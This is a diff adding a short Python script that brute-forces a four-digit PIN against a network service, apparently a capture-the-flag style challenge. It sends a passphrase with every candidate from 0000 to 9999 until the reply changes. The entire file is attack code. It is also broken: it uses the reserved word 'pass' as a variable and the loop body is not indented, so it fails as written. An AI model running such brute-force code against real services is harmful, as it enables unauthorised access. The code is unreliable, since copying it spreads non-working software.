@@ -1,0 +1,22 @@
+import socket,time
+
+ip = str(input('Hostname or IP: '))
+port = int(input('Port: '))
+pass = input('Please input passphrase: ')
+error = b'Wrong! Please enter the correct pincode. Try again.\n'
+
+client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+client.connect((ip,port))
+time.sleep(2)
+
+while True:
+  i = ['{0:04}'.format(num) for num in range(0,10000)]
+  for li in range(int(input('Where to start?: ')),10000):
+  print(pass+' '+i[li])
+  client.send(bytes(pass+' '+i[li]+'\n','utf-8'))
+  retdata = client.recv(2048)
+  if retdata == error:
+    continue
+  else:
+    print(retdata)
+    break
